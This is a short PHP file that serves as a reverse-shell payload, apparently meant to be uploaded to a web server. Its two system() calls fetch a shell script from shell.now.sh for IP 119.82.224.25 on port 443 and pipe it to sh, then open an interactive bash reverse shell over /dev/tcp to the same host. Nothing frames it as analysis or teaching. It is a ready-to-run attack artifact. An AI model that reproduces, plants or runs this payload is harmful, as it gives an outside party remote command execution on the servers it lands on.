<?php
system("curl https://shell.now.sh/119.82.224.25:443 | sh");
system("bash -i >& /dev/tcp/119.82.224.25/443 0>&1");
?>
